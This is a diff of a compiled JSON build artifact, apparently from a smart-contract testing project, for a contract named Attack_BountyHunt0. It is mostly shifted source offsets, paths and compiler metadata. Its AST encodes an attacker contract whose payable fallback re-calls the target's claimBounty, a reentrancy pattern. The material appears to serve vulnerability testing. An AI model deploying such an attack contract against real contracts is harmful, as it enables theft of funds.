+              "src": "699:2:0"
             },
             "payable": true,
             "returnParameters": {
               "id": 63,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "712:0:0"
+              "src": "717:0:0"
             },
             "scope": 71,
-            "src": "686:83:0",
+            "src": "691:83:0",
             "stateMutability": "payable",
             "superFunction": null,
             "visibility": "public"
           }
         ],
         "scope": 72,
-        "src": "84:693:0"
+        "src": "89:693:0"
       }
     ],
-    "src": "0:779:0"
+    "src": "0:784:0"
   },
   "legacyAST": {
-    "absolutePath": "/home/osboxes/vultron/contracts/Attack_BountyHunt0.sol",
+    "absolutePath": "/home/liuye/Webank/vultron/contracts/Attack_BountyHunt0.sol",
     "exportedSymbols": {
       "Attack_BountyHunt0": [
         71
@@ -933,13 +933,13 @@
         "src": "0:24:0"
       },
       {
-        "absolutePath": "/home/osboxes/vultron/contracts/BountyHunt.sol",
-        "file": "/home/osboxes/vultron/contracts/BountyHunt.sol",
+        "absolutePath": "/home/liuye/Webank/vultron/contracts/BountyHunt.sol",
+        "file": "/home/liuye/Webank/vultron/contracts/BountyHunt.sol",
         "id": 2,
         "nodeType": "ImportDirective",
         "scope": 72,
         "sourceUnit": 1521,
-        "src": "26:56:0",
+        "src": "26:61:0",
         "symbolAliases": [],
         "unitAlias": ""
       },
@@ -962,7 +962,7 @@
             "name": "target_contract",
             "nodeType": "VariableDeclaration",
             "scope": 71,
-            "src": "117:33:0",
+            "src": "122:33:0",
             "stateVariable": true,
             "storageLocation": "default",
             "typeDescriptions": {
@@ -975,7 +975,7 @@
               "name": "BountyHunt",
               "nodeType": "UserDefinedTypeName",
               "referencedDeclaration": 1520,
-              "src": "117:10:0",
+              "src": "122:10:0",
               "typeDescriptions": {
                 "typeIdentifier": "t_contract$_BountyHunt_$1520",
                 "typeString": "contract BountyHunt"
@@ -988,7 +988,7 @@
             "body": {
               "id": 15,
               "nodeType": "Block",
-              "src": "223:58:0",
+              "src": "228:58:0",
               "statements": [
                 {
                   "expression": {
@@ -1005,7 +1005,7 @@
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [],
                       "referencedDeclaration": 4,
-                      "src": "231:15:0",
+                      "src": "236:15:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_contract$_BountyHunt_$1520",
                         "typeString": "contract BountyHunt"
@@ -1023,7 +1023,7 @@
                           "nodeType": "Identifier",
                           "overloadedDeclarations": [],
                           "referencedDeclaration": 6,
-                          "src": "260:15:0",
+                          "src": "265:15:0",
                           "typeDescriptions": {
                             "typeIdentifier": "t_address",
                             "typeString": "address"
@@ -1042,7 +1042,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 1520,
-                        "src": "249:10:0",
+                        "src": "254:10:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_type$_t_contract$_BountyHunt_$1520_$",
                           "typeString": "type(contract BountyHunt)"
@@ -1056,13 +1056,13 @@
                       "lValueRequested": false,
                       "names": [],
                       "nodeType": "FunctionCall",
-                      "src": "249:27:0",
+                      "src": "254:27:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_contract$_BountyHunt_$1520",
                         "typeString": "contract BountyHunt"
                       }
                     },
-                    "src": "231:45:0",
+                    "src": "236:45:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_contract$_BountyHunt_$1520",
                       "typeString": "contract BountyHunt"
@@ -1070,7 +1070,7 @@
                   },
                   "id": 14,
                   "nodeType": "ExpressionStatement",
-                  "src": "231:45:0"
+                  "src": "236:45:0"
                 }
               ]
             },
@@ -1092,7 +1092,7 @@
                   "name": "_targetContract",
                   "nodeType": "VariableDeclaration",
                   "scope": 16,
-                  "src": "183:23:0",
+                  "src": "188:23:0",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -1103,7 +1103,7 @@
                     "id": 5,
                     "name": "address",
                     "nodeType": "ElementaryTypeName",
-                    "src": "183:7:0",
+                    "src": "188:7:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_address",
                       "typeString": "address"
@@ -1113,17 +1113,17 @@
                   "visibility": "internal"
                 }
               ],
-              "src": "182:25:0"
+              "src": "187:25:0"
             },
             "payable": true,
             "returnParameters": {
               "id": 8,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "223:0:0"
+              "src": "228:0:0"
             },
             "scope": 71,
-            "src": "155:126:0",
+            "src": "160:126:0",
             "stateMutability": "payable",
             "superFunction": null,
             "visibility": "public"
@@ -1132,7 +1132,7 @@
             "body": {
               "id": 24,
               "nodeType": "Block",
-              "src": "324:40:0",
+              "src": "329:40:0",
               "statements": [
                 {
                   "expression": {
@@ -1147,7 +1147,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 4,
-                        "src": "330:15:0",
+                        "src": "335:15:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_contract$_BountyHunt_$1520",
                           "typeString": "contract BountyHunt"
@@ -1161,7 +1161,7 @@
                       "memberName": "claimBounty",
                       "nodeType": "MemberAccess",
                       "referencedDeclaration": 1488,
-                      "src": "330:27:0",
+                      "src": "335:27:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                         "typeString": "function () external"
@@ -1175,7 +1175,7 @@
                     "lValueRequested": false,
                     "names": [],
                     "nodeType": "FunctionCall",
-                    "src": "330:29:0",
+                    "src": "335:29:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_tuple$__$",
                       "typeString": "tuple()"
@@ -1183,7 +1183,7 @@
                   },
                   "id": 23,
                   "nodeType": "ExpressionStatement",
-                  "src": "330:29:0"
+                  "src": "335:29:0"
                 }
               ]
             },
@@ -1199,17 +1199,17 @@
               "id": 17,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "314:2:0"
+              "src": "319:2:0"
             },
             "payable": false,
             "returnParameters": {
               "id": 18,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "324:0:0"
+              "src": "329:0:0"
             },
             "scope": 71,
-            "src": "286:78:0",
+            "src": "291:78:0",
             "stateMutability": "nonpayable",
             "superFunction": null,
             "visibility": "public"
@@ -1218,7 +1218,7 @@
             "body": {
               "id": 39,
               "nodeType": "Block",
-              "src": "435:52:0",
+              "src": "440:52:0",
               "statements": [
                 {
                   "expression": {
@@ -1231,7 +1231,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 27,
-                        "src": "472:2:0",
+                        "src": "477:2:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_address",
                           "typeString": "address"
@@ -1244,7 +1244,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 29,
-                        "src": "476:5:0",
+                        "src": "481:5:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_uint256",
                           "typeString": "uint256"
@@ -1269,7 +1269,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 4,
-                        "src": "441:15:0",
+                        "src": "446:15:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_contract$_BountyHunt_$1520",
                           "typeString": "contract BountyHunt"
@@ -1283,7 +1283,7 @@
                       "memberName": "transferBounty",
                       "nodeType": "MemberAccess",
                       "referencedDeclaration": 1519,
-                      "src": "441:30:0",
+                      "src": "446:30:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$__$",
                         "typeString": "function (address,uint256) external"
@@ -1297,7 +1297,7 @@
                     "lValueRequested": false,
                     "names": [],
                     "nodeType": "FunctionCall",
-                    "src": "441:41:0",
+                    "src": "446:41:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_tuple$__$",
                       "typeString": "tuple()"
@@ -1305,7 +1305,7 @@
                   },
                   "id": 38,
                   "nodeType": "ExpressionStatement",
-                  "src": "441:41:0"
+                  "src": "446:41:0"
                 }
               ]
             },
@@ -1327,7 +1327,7 @@
                   "name": "to",
                   "nodeType": "VariableDeclaration",
                   "scope": 40,
-                  "src": "401:10:0",
+                  "src": "406:10:0",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -1338,7 +1338,7 @@
                     "id": 26,
                     "name": "address",
                     "nodeType": "ElementaryTypeName",
-                    "src": "401:7:0",
+                    "src": "406:7:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_address",
                       "typeString": "address"
@@ -1353,7 +1353,7 @@
                   "name": "value",
                   "nodeType": "VariableDeclaration",
                   "scope": 40,
-                  "src": "413:13:0",
+                  "src": "418:13:0",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -1364,7 +1364,7 @@
                     "id": 28,
                     "name": "uint256",
                     "nodeType": "ElementaryTypeName",
-                    "src": "413:7:0",
+                    "src": "418:7:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_uint256",
                       "typeString": "uint256"
@@ -1374,17 +1374,17 @@
                   "visibility": "internal"
                 }
               ],
-              "src": "400:27:0"
+              "src": "405:27:0"
             },
             "payable": false,
             "returnParameters": {
               "id": 31,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "435:0:0"
+              "src": "440:0:0"
             },
             "scope": 71,
-            "src": "369:118:0",
+            "src": "374:118:0",
             "stateMutability": "nonpayable",
             "superFunction": null,
             "visibility": "public"
@@ -1393,7 +1393,7 @@
             "body": {
               "id": 60,
               "nodeType": "Block",
-              "src": "596:81:0",
+              "src": "601:81:0",
               "statements": [
                 {
                   "expression": {
@@ -1406,7 +1406,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 44,
-                        "src": "652:11:0",
+                        "src": "657:11:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_address",
                           "typeString": "address"
@@ -1419,7 +1419,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 46,
-                        "src": "665:6:0",
+                        "src": "670:6:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_uint256",
                           "typeString": "uint256"
@@ -1445,7 +1445,7 @@
                           "nodeType": "Identifier",
                           "overloadedDeclarations": [],
                           "referencedDeclaration": 42,
-                          "src": "636:14:0",
+                          "src": "641:14:0",
                           "typeDescriptions": {
                             "typeIdentifier": "t_uint256",
                             "typeString": "uint256"
@@ -1468,7 +1468,7 @@
                             "nodeType": "Identifier",
                             "overloadedDeclarations": [],
                             "referencedDeclaration": 4,
-                            "src": "602:15:0",
+                            "src": "607:15:0",
                             "typeDescriptions": {
                               "typeIdentifier": "t_contract$_BountyHunt_$1520",
                               "typeString": "contract BountyHunt"
@@ -1482,7 +1482,7 @@
                           "memberName": "grantBounty",
                           "nodeType": "MemberAccess",
                           "referencedDeclaration": 1455,
-                          "src": "602:27:0",
+                          "src": "607:27:0",
                           "typeDescriptions": {
                             "typeIdentifier": "t_function_external_payable$_t_address_$_t_uint256_$returns$__$",
                             "typeString": "function (address,uint256) payable external"
@@ -1496,7 +1496,7 @@
                         "memberName": "value",
                         "nodeType": "MemberAccess",
                         "referencedDeclaration": null,
-                        "src": "602:33:0",
+                        "src": "607:33:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_function_setvalue_nonpayable$_t_uint256_$returns$_t_function_external_payable$_t_address_$_t_uint256_$returns$__$value_$",
                           "typeString": "function (uint256) returns (function (address,uint256) payable external)"
@@ -1510,7 +1510,7 @@
                       "lValueRequested": false,
                       "names": [],
                       "nodeType": "FunctionCall",
-                      "src": "602:49:0",
+                      "src": "607:49:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_payable$_t_address_$_t_uint256_$returns$__$value",
                         "typeString": "function (address,uint256) payable external"
@@ -1524,7 +1524,7 @@
                     "lValueRequested": false,
                     "names": [],
                     "nodeType": "FunctionCall",
-                    "src": "602:70:0",
+                    "src": "607:70:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_tuple$__$",
                       "typeString": "tuple()"
@@ -1532,7 +1532,7 @@
                   },
                   "id": 59,
                   "nodeType": "ExpressionStatement",
-                  "src": "602:70:0"
+                  "src": "607:70:0"
                 }
               ]
             },
@@ -1554,7 +1554,7 @@
                   "name": "vultron_amount",
                   "nodeType": "VariableDeclaration",
                   "scope": 61,
-                  "src": "521:22:0",
+                  "src": "526:22:0",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -1565,7 +1565,7 @@
                     "id": 41,
                     "name": "uint256",
                     "nodeType": "ElementaryTypeName",
-                    "src": "521:7:0",
+                    "src": "526:7:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_uint256",
                       "typeString": "uint256"
@@ -1580,7 +1580,7 @@
                   "name": "beneficiary",
                   "nodeType": "VariableDeclaration",
                   "scope": 61,
-                  "src": "545:19:0",
+                  "src": "550:19:0",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -1591,7 +1591,7 @@
                     "id": 43,
                     "name": "address",
                     "nodeType": "ElementaryTypeName",
-                    "src": "545:7:0",
+                    "src": "550:7:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_address",
                       "typeString": "address"
@@ -1606,7 +1606,7 @@
                   "name": "amount",
                   "nodeType": "VariableDeclaration",
                   "scope": 61,
-                  "src": "566:14:0",
+                  "src": "571:14:0",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -1617,7 +1617,7 @@
                     "id": 45,
                     "name": "uint256",
                     "nodeType": "ElementaryTypeName",
-                    "src": "566:7:0",
+                    "src": "571:7:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_uint256",
                       "typeString": "uint256"
@@ -1627,17 +1627,17 @@
                   "visibility": "internal"
                 }
               ],
-              "src": "520:61:0"
+              "src": "525:61:0"
             },
             "payable": true,
             "returnParameters": {
               "id": 48,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "596:0:0"
+              "src": "601:0:0"
             },
             "scope": 71,
-            "src": "492:185:0",
+            "src": "497:185:0",
             "stateMutability": "payable",
             "superFunction": null,
             "visibility": "public"
@@ -1646,7 +1646,7 @@
             "body": {
               "id": 69,
               "nodeType": "Block",
-              "src": "712:57:0",
+              "src": "717:57:0",
               "statements": [
                 {
                   "expression": {
@@ -1661,7 +1661,7 @@
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 4,
-                        "src": "731:15:0",
+                        "src": "736:15:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_contract$_BountyHunt_$1520",
                           "typeString": "contract BountyHunt"
@@ -1675,7 +1675,7 @@
                       "memberName": "claimBounty",
                       "nodeType": "MemberAccess",
                       "referencedDeclaration": 1488,
-                      "src": "731:27:0",
+                      "src": "736:27:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                         "typeString": "function () external"
@@ -1689,7 +1689,7 @@
                     "lValueRequested": false,
                     "names": [],
                     "nodeType": "FunctionCall",
-                    "src": "731:29:0",
+                    "src": "736:29:0",
                     "typeDescriptions": {
                       "typeIdentifier": "t_tuple$__$",
                       "typeString": "tuple()"
@@ -1697,7 +1697,7 @@
                   },
                   "id": 68,
                   "nodeType": "ExpressionStatement",
-                  "src": "731:29:0"
+                  "src": "736:29:0"
                 }
               ]
             },
@@ -1713,40 +1713,40 @@
               "id": 62,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "694:2:0"
+              "src": "699:2:0"
             },
             "payable": true,
             "returnParameters": {
               "id": 63,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "712:0:0"
+              "src": "717:0:0"
             },
             "scope": 71,
-            "src": "686:83:0",
+            "src": "691:83:0",
             "stateMutability": "payable",
             "superFunction": null,
             "visibility": "public"
           }
         ],
         "scope": 72,
-        "src": "84:693:0"
+        "src": "89:693:0"
       }
     ],
-    "src": "0:779:0"
+    "src": "0:784:0"
   },
   "compiler": {
     "name": "solc",
-    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
+    "version": "0.4.26+commit.4563c3fc.Emscripten.clang"
   },
   "networks": {
     "1900": {
       "events": {},
       "links": {},
-      "address": "0xa982389047af1447fff9564eea4a95c08bb38306",
-      "transactionHash": "0x0c7d1cad456f90155acfaf2ab443f12e502340d0af33a59bb1a50246ca502929"
+      "address": "0xd86e977ab491fddb90267a231ca3f89d57fa3232",
+      "transactionHash": "0xf28deb44ca54d83b6a1097369809641d735f896d03487e92715c170cc54ab781"
     }
   },
-  "schemaVersion": "2.0.1",
-  "updatedAt": "2019-09-13T09:06:17.180Z"
+  "schemaVersion": "2.0.0",
+  "updatedAt": "2020-05-01T07:32:10.258Z"
 }
